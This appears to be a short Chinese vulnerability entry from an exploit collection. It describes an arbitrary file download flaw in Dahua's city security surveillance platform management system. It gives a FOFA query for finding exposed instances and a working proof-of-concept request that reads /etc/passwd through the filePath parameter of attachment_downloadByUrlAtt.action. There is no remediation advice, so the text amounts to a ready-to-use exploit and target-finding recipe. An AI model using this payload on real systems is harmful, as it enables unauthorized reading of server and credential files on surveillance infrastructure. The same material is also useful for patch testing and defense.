# 大华 城市安防监控系统平台管理 attachment_downloadByUrlAtt.action 任意文件下载漏洞

## 漏洞描述

大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
大华城市安防监控系统平台管理
```

## FOFA

```
"attachment_downloadByUrlAtt.action"
```

## 漏洞复现

登录页面

![image-20220519183144081](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191831267.png)

验证POC

```
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

![image-20220519183319607](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191833705.png)